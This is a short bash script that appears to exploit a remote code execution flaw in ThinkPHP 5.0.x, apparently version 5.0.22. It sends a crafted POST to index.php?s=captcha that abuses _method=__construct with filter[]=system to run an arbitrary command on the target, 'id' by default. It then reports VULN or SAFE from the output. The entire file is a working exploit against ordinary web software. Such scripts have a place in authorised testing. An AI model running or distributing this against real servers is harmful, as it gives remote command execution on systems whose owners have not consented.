#!/usr/bin/env bash
set -u
TARGET="${1:?usage: bash tp5022.sh http://TARGET:PORT [cmd]}"
CMD="${2:-id}"
BASE="${TARGET%/}/index.php?s=captcha"
body="$(curl -sS -m 10 -X POST "$BASE" \
  --data-urlencode '_method=__construct' \
  --data-urlencode 'filter[]=system' \
  --data-urlencode 'method=get' \
  --data-urlencode "get[]=$CMD" \
  --data-urlencode 'server[REQUEST_METHOD]=1' 2>/dev/null)"
if printf '%s' "$body" | grep -qE 'uid=[0-9]+|gid=[0-9]+'; then
  echo "VULN  $BASE"; printf '%s\n' "$body" | head -5; exit 0
fi
echo "SAFE  $BASE"; exit 1
